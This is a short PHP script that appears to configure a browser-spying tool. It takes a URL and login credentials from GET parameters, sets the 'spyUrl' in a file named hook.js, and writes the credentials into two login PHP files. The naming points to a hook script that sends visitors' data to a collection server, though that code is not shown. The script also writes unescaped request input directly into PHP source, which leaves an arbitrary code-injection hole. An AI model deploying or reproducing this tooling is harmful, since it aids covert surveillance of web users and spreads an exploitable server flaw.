<?php
$mainUrl = base64_decode($_GET['mainUrl']);
$username = base64_decode($_GET['username']);
$password = base64_decode($_GET['password']);
$contentsAfterLine = substr(file_get_contents("hook.js"), strpos(file_get_contents("hook.js"), '";') + 2);
$urlCodeBefore = 'var spyUrl = "';
$content = $urlCodeBefore.$mainUrl.'";'.$contentsAfterLine;
file_put_contents("hook.js", $content);
$contentsAfterLine = substr(file_get_contents("login.php"), strpos(file_get_contents("login.php"), "';") + 2);
$urlCodeBefore = '<?php 
$username = "";
$password = '."'";
$content1 = $urlCodeBefore.$password."';".$contentsAfterLine;
$content = str_replace('$username = ""', '$username = "'.$username.'"', $content1);
file_put_contents("login.php", $content);
$contentsAfterLine = substr(file_get_contents("login2.php"), strpos(file_get_contents("login2.php"), "';") + 2);
$urlCodeBefore = '<?php 
$username = "";
$password = '."'";
$content1 = $urlCodeBefore.$password."';".$contentsAfterLine;
$content = str_replace('$username = ""', '$username = "'.$username.'"', $content1);
file_put_contents("login2.php", $content);
?>